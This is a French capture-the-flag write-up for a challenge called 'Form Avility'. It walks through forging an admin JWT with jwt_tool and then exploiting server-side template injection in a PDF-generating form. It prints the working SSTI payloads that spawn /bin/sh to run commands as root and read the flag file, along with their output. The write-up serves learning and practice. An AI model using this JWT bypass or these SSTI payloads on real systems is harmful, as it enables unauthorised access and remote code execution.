Form Avility
--------------

On a une page avec un formulaire de sondage, mais qui n'a pas l'air très utile. 

Et un formulaire de connexion et d'inscription.

En s'inscrivant on reçoit un JWT, on tente de crack le mot de passe mais non. 

On va donc s'intéressé aux exploits connus grâce à jwt_tool.

On obtient le bon cookie avec cette commande, et en modifiant le role par "admin" : 


.. code-block:: console

    python3 jwt_tool.py -X b -T "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzUwNTM0NDkwNjQ1LCJhZ2VudCI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NTA1MzQ0OTF9.DNFgKveOoPA08splrsZ37W0L7bqoi9XWBsBAsA6-Qh0"
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzUwNTM0NDkwNjQ1LCJhZ2VudCI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzUwNTM0NDkxfQ.0MJw_Emrt735FHd6sq4-TDt3ZQoLUbOFIvlQhBCjC1o

On a donc maintenant accès à un nouveau formulaire sur /name_form 

Ce formulaire génère un fichier pdf avec le contenu envoyé. 

On a surement une XSS Server side : https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7 

Cependant cela ne fonctionne pas. 

On va tester la SSTI avec le fameux : 

.. code-block:: console

    {{7*7}}

On obtient alors 49 dans le nom ! 

Il ne reste plus qu'a trouver le bon payload. 

.. code-block:: console

    {{'a'.toUpperCase()}}
    ==> A
    {{ (function(){return 1337})() }}
    ==> 1337
    {{ this.constructor.constructor('return process')().env }}
    ==> [object Object]
    {{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
    ==> uid=0(root) gid=0(root) groups=0(root)
    ==> Dockerfile
    ==> docker-compose.yml
    ==> flag.txt
    ==> lib
    ==> node_modules
    ==> package-lock.json
    ==> package.json
    ==> server.js
    ==> views

On peut voir qu'il y a un fichier flag, il nous suffit de modifier le payload obtenu ici : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md 

.. code-block:: console

    {{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","cat flag.txt"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}} 
    SHLK{JwT_bYpaS5_2_RCe}

On a donc notre flag : **SHLK{JwT_bYpaS5_2_RCe}**